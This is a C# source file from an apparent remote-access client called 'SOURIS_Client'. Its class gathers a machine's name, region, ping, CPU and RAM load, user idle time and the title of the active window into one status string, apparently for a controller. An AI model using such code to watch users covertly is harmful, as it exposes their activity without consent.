using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace SOURIS_Client
{
    class InfoFunc
    {
        //<---------------------------------Get Last input----------------------------->
        [DllImport("User32.dll")]
        private static extern bool
                GetLastInputInfo(ref LASTINPUTINFO plii);
        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 dwTime;
        }
        static string GetLastInputTime()
        {
            uint idleTime = 0;
            LASTINPUTINFO lastInputInfo = new LASTINPUTINFO();
            lastInputInfo.cbSize = (uint)Marshal.SizeOf(lastInputInfo);
            lastInputInfo.dwTime = 0;
            uint envTicks = (uint)Environment.TickCount;
            if (GetLastInputInfo(ref lastInputInfo))
            {
                uint lastInputTick = lastInputInfo.dwTime;

                idleTime = envTicks - lastInputTick;
            }
            uint Seconds = ((idleTime > 0) ? (idleTime / 1000) : 0);
            if (Seconds > 30)
            {
                TimeSpan time = TimeSpan.FromSeconds(Seconds);
                string str = time.ToString(@"hh\:mm\:ss\");
                return str;
            }
            else
            {
                return "Not Idle !";
            }
        }
        //<---------------------------------Get Foreground Window----------------------------->

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
        //<---------------------------------Get CPU and RAM Usage----------------------------->
        public static string CpuUsage()
        {
            PerformanceCounter cpuCounter;
            cpuCounter = new PerformanceCounter();
            cpuCounter.CategoryName = "Processor";
            cpuCounter.CounterName = "% Processor Time";
            cpuCounter.InstanceName = "_Total";
            var currentCpuUsage = cpuCounter.NextValue();
            Task.Delay(1000).Wait();
            currentCpuUsage = cpuCounter.NextValue();
            int cpuusageint = (int)currentCpuUsage;
            return cpuusageint + "%";
        }

        public static string RamUsage()
        {
            var wmiObject = new ManagementObjectSearcher("select * from Win32_OperatingSystem");

            var memoryValues = wmiObject.Get().Cast<ManagementObject>().Select(mo => new {
                FreePhysicalMemory = Double.Parse(mo["FreePhysicalMemory"].ToString()),
                TotalVisibleMemorySize = Double.Parse(mo["TotalVisibleMemorySize"].ToString())
            }).FirstOrDefault();

            var percent = ((memoryValues.TotalVisibleMemorySize - memoryValues.FreePhysicalMemory) / memoryValues.TotalVisibleMemorySize) * 100;
            return Math.Round(percent).ToString() + "%";
        }
        //<---------------------------------Get AllInfo----------------------------->

        public static string GetAllInfo()
        {
            string machinename = Environment.MachineName;
            string country = System.Globalization.RegionInfo.CurrentRegion.ToString();
            string ping = new Ping().Send("www.google.com").RoundtripTime.ToString();
            string cpuuse = CpuUsage();
            string ramuse = RamUsage();
            string lastinput = GetLastInputTime();
            string activewindow = GetActiveWindowTitle();
            string message = $"{machinename}|{country}|{ping}ms|{cpuuse}|{ramuse}|{lastinput}|{activewindow}";
            return message;
        }
        //<---------------------------------Get Last input----------------------------->
    }
}
